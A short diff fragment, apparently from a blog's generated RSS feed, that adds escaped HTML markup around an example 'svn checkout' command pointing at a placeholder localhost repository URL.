+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>svn checkout https://localhost/username/repo/dir1/dir2/proj1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item></channel></rss>
